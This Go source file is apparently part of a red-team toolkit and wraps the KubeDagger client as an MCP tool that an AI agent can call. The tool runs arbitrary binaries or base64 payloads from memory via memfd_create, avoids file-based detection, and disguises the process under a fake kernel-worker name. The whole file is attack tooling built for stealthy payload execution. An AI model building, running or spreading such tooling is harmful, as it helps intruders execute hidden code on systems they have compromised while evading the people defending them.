package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type FilelessExecInput struct {
	Payload  string `json:"payload"`
	FakeName string `json:"fake_name,omitempty"`
}

type FilelessExecTool struct {
	exec executor.Executor
}

func NewFilelessExec(exec executor.Executor) *FilelessExecTool {
	return &FilelessExecTool{exec: exec}
}

func (t *FilelessExecTool) Name() string { return "kubedagger_fileless_exec" }

func (t *FilelessExecTool) Description() string {
	return "Execute binaries directly from memory using memfd_create without touching disk. Takes an ELF file path or base64-encoded payload and executes it via /proc/self/fd, invisible to file-based detection and leaving no filesystem artifacts."
}

func (t *FilelessExecTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"payload": {
				"type": "string",
				"description": "ELF file path or base64-encoded binary payload (required)"
			},
			"fake_name": {
				"type": "string",
				"description": "Process name to display in /proc for camouflage (default: [kworker/0:1])"
			}
		},
		"required": ["payload"]
	}`)
}

func (t *FilelessExecTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input FilelessExecInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.Payload == "" {
		return errorResult("payload is required"), nil
	}
	if err := validateSafeString(input.Payload, "payload"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.FakeName, "fake_name"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"fileless-exec", "--payload", input.Payload}
	if input.FakeName != "" {
		args = append(args, "--fake-name", input.FakeName)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger fileless-exec failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Fileless Exec\n\n")
	if output == "" {
		sb.WriteString("Execution completed (no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
